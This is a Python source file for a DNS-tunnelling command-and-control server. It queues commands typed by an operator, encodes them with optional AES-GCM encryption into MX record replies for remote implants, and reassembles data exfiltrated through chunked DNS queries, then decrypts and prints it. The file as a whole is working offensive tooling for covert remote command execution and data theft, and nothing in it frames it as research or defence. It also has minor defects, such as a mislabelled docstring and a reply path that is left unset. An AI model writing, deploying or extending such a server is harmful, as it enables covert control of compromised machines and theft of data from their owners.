import argparse
import base64
import os
import socket
import threading
import time
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from dnslib import DNSRecord, QTYPE, MX, RR

class C2Server:
    def __init__(self, domain: str, listen_ip: str = "0.0.0.0", port: int = 53, aes_key: str = None):
        self.domain = domain.lower().strip(".")
        self.listen_ip = listen_ip
        self.port = port
        self.command_queue = []
        self.running = True
        
        # Setup AES key if provided
        self.aesgcm = None
        if aes_key:
            key_bytes = bytes.fromhex(aes_key)
            self.aesgcm = AESGCM(key_bytes)
            print("[+] AES-256-GCM Encryption ENABLED")
        else:
            print("[!] Running in PLAINTEXT mode (No AES)")

    def encrypt_payload(self, plain_text: str) -> str:
        """Encrypts payload with AES-GCM or falls back to plain base64url."""
        if not self.aesgcm:
            encoded = base64.b64encode(plain_text.encode('utf-8')).decode('utf-8')
            return encoded.rstrip("=").replace("+", "-").replace("/", "_")
            
        nonce = os.urandom(12)
        ciphertext = self.aesgcm.encrypt(nonce, plain_text.encode('utf-8'), None)
        packed = nonce + ciphertext
        encoded = base64.b64encode(packed).decode('utf-8')
        return encoded.rstrip("=").replace("+", "-").replace("/", "_")

    def decrypt_payload(self, encrypted_text: str) -> str:
        """Encrypts payload with AES-GCM or falls back to plain base64url."""

        missing_padding = len(encrypted_text) % 4
        if missing_padding:
            encrypted_text += "=" * (4 - missing_padding)

        raw_bytes = base64.urlsafe_b64decode(encrypted_text)

        if not self.aesgcm:
            return raw_bytes.decode("utf-8")

    # AES-GCM path: unpack nonce (first 12 bytes) and ciphertext
        
        nonce = raw_bytes[:12]
        ciphertext = raw_bytes[12:]

        decrypted_bytes = self.aesgcm.decrypt(nonce, ciphertext, None)
        return decrypted_bytes.decode("utf-8")

    def create_mx_response(self, request, qname, raw_command: str):
        """Constructs an MX DNS reply with AA=1 explicitly set."""
        reply = request.reply()
        reply.header.aa = 1  # Authoritative Answer flag required by recursive resolvers
        
        if raw_command:
            payload = self.encrypt_payload(raw_command)
            mx_host = f"cmd.{payload}.{self.domain}"
        else:
            mx_host = f"idle.{self.domain}"

        reply.add_answer(RR(qname, QTYPE.MX, rdata=MX(preference=10, label=mx_host), ttl=0))
        return reply

    def listen_dns(self):
        """Runs the UDP DNS listener in a background thread."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.listen_ip, self.port))
        sock.settimeout(0.5)
        c2data = []


        while self.running:
            try:
                data, addr = sock.recvfrom(4096)
            except socket.timeout:
                continue
            except Exception as e:
                print(f"\n[-] Socket Error: {e}")
                break

            try:
                request = DNSRecord.parse(data)
                qname = str(request.q.qname).strip(".")
                
                if request.q.qtype == QTYPE.MX and self.domain in qname:
                    # Handle Data Upload / Exfiltration chunks
                    if "exil." in qname:
                        parts = qname.split(".")
                        chunk_data = parts[1]
                        c2data.append(chunk_data)

                        
                        
                        reply = request.reply()
                        reply.header.aa = 1
                        reply.add_answer(RR(qname, QTYPE.MX, rdata=MX(preference=10, label=f"ack.{self.domain}"), ttl=0))
                    
                    # Handle Beacon / Command Polling
                    elif qname.startswith("done"):
                        encmessage = "".join(c2data) 
                        plainmessage = self.decrypt_payload(encmessage)
                        print(f"\n\n[+] [RESPONSE]\n{plainmessage}\ndns_demo> ", end="", flush=True)
                        c2data.clear()


                    else:
                        next_cmd = self.command_queue.pop(0) if self.command_queue else ""
                        if next_cmd:
                            print(f"\n[+] [BEACON SERVICED] Executing -> '{next_cmd}'\ndns_demo> ", end="", flush=True)
                        reply = self.create_mx_response(request, qname, next_cmd)

                    sock.sendto(reply.pack(), addr)

            except Exception as e:
                print(f"\n[-] Error parsing DNS packet: {e}\ndns_demo> ", end="", flush=True)

        sock.close()

    def start_shell(self):
        """Main thread interactive prompt for user commands."""
        print(f"[*] C2 Server Active. Domain: {self.domain} | Listening on {self.listen_ip}:{self.port}")
        print("[*] Type commands to queue them for the client.\n")

        # Start DNS listener in a daemon thread
        listener_thread = threading.Thread(target=self.listen_dns, daemon=True)
        listener_thread.start()

        while self.running:
            try:
                cmd = input("dns_demo> ").strip()
                if not cmd:
                    continue
                
                if cmd.lower() in ["exit", "quit"]:
                    print("[*] Shutting down server...")
                    self.running = False
                    break
                elif cmd.lower() == "help":
                    print("\nUse standard commands, but be weary of large outputs")
                    print("\n--- Available Additional Commands ---")
                    print("  queue                : Display currently pending commands")
                    print("  exit / quit          : Terminate the C2 server\n")
                elif cmd.lower() == "queue":
                    print(f"Pending Commands ({len(self.command_queue)}): {self.command_queue}")
                else:
                    self.command_queue.append(cmd)
                    print(f"[+] Command queued ({len(self.command_queue)} in queue): '{cmd}'")

            except (KeyboardInterrupt, EOFError):
                print("\n[*] Exiting server...")
                self.running = False
                break


def main():
    parser = argparse.ArgumentParser(description="Python DoH C2 Server with Interactive Shell")
    parser.add_argument("-d", "--domain", required=True, help="Delegated C2 subdomain (e.g., c2.yourdomain.com)")
    parser.add_argument("-i", "--ip", default="0.0.0.0", help="IP interface to bind UDP server (default: 0.0.0.0)")
    parser.add_argument("-p", "--port", type=int, default=53, help="Port to bind UDP server (default: 53)")
    parser.add_argument("-k", "--key", help="Optional secret key for AES-256-GCM encryption")
    
    args = parser.parse_args()

    server = C2Server(domain=args.domain, listen_ip=args.ip, port=args.port, aes_key=args.key)
    server.start_shell()

if __name__ == "__main__":
    main()
